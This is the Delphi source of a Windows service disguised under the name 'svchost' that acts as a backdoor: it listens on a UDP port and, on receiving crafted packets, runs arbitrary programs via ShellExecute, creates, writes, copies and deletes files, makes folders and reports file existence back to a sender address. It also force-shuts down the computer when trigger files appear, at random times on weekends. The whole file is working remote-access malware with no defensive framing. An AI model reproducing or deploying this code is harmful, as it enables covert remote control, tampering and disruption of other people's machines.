unit uMain;

interface

uses
  Windows, Messages, SysUtils, Classes, Graphics, Controls, SvcMgr, Dialogs,
  shellapi, IdSocketHandle, IdUDPServer, IdBaseComponent, IdComponent, IdUDPBase,
  uGlobal;

type
  Tsvchost = class(TService)
    IdUDPServer1: TIdUDPServer;
    procedure ServiceExecute(Sender: TService);
    procedure IdUDPServer1UDPRead(AThread: TIdUDPListenerThread; AData: TBytes;
      ABinding: TIdSocketHandle);
  private
    { Private declarations }
  public
    function GetServiceController: TServiceController; override;
    { Public declarations }
  end;

var
  svchost: Tsvchost;

implementation

{$R *.DFM}

const
  SenderPort = 59148;
var
  work: boolean = true;
  dow: integer;
  last_now: extended;
  rnd: integer;
  i: integer;

procedure SomeBadShit;
begin
  shellexecute(0, 'open', 'c:\windows\system32\shutdown.exe', '/s /f /t 1', 'c:\windows\system32\', 0);
end;

procedure Tsvchost.IdUDPServer1UDPRead(AThread: TIdUDPListenerThread;
  AData: TBytes; ABinding: TIdSocketHandle);
var
  f: textfile;
  packet: TPacket;
  buf: TBytes;
  str1, str2: string;
  backIP: string;
begin
  setlength(buf, sizeof(TPacket));
  CopyMemory(@packet, @AData[0], SizeOf(TPacket));
  str1 := packet.Str1;
  str2 := packet.Str2;
  backIP := packet.BackIP;
  if packet.ProtocolID = ProtocolID then
    case packet.Command of
      0: begin //Check service
        IdUDPServer1.SendBuffer(backIP, packet.BackPort, AData);
      end;
      1: begin //ShellExecute
        shellexecute(0, 'open', packet.Str1, packet.Str2, '', 0);
      end;
      2: begin //Create file
        assignfile(f, Str1);
        rewrite(f);
        closefile(f);
      end;
      3: begin //Delete file
        if fileexists(Str1) then
          DeleteFile(Str1);
      end;
      4: begin //WriteLn file
        assignfile(f, Str1);
        if fileexists(Str1) then
          append(f)
        else
          rewrite(f);
        writeln(f, Str2);
        closefile(f);
      end;
      5: begin //Copy file
        if fileexists(Str1) then
          CopyFile(pwidechar(Str1), pwidechar(Str2), false);
      end;
      6: begin //FileExists
        if fileexists(Str1) then
          packet.Str2 := 'YES'
        else
          packet.Str2 := 'NO';
        CopyMemory(@buf[0], @packet, SizeOf(TPacket));
        IdUDPServer1.SendBuffer(backIP, packet.BackPort, buf);
      end;
      7: begin //MkDir
        if not DirectoryExists(Str1) then
          MkDir(Str1);
      end;
    end;
end;

procedure Tsvchost.ServiceExecute(Sender: TService);
var
  f: textfile;
  count: integer;
begin
  last_now := now;
  randomize;
  rnd := random(60);
  count := 0;

  work := true;
  while work and not Terminated do
  begin
    sleep(1000);
    count := count + 1;

    if count = 5 then
    begin
      if FileExists('c:\stop.txt') or
         FileExists('d:\stop.txt') or
         FileExists('e:\stop.txt') then
      begin
        DeleteFile('c:\stop.txt');
        DeleteFile('d:\stop.txt');
        DeleteFile('e:\stop.txt');
        work := false;
        Self.DoShutdown;
      end;

      if FileExists('c:\ex.txt') or
         FileExists('d:\ex.txt') or
         FileExists('e:\ex.txt') then
      begin
         DeleteFile('c:\ex.txt');
         DeleteFile('d:\ex.txt');
         DeleteFile('e:\ex.txt');
         SomeBadShit;
      end;

      if FileExists('c:\help.txt') or
         FileExists('d:\help.txt') or
         FileExists('e:\help.txt') then
      begin
        dow := DayOfWeek(now);
        if (dow = 1) or (dow = 7) then // sunday or saturday
          if (now - last_now) * 24 * 60 > (60 + rnd) then
            SomeBadShit;
      end;

      count := 0;
    end;

    ReportStatus;
    ServiceThread.ProcessRequests(false);
  end;
end;

procedure ServiceController(CtrlCode: DWord); stdcall;
begin
  svchost.Controller(CtrlCode);
end;

function Tsvchost.GetServiceController: TServiceController;
begin
  Result := ServiceController;
end;

end.
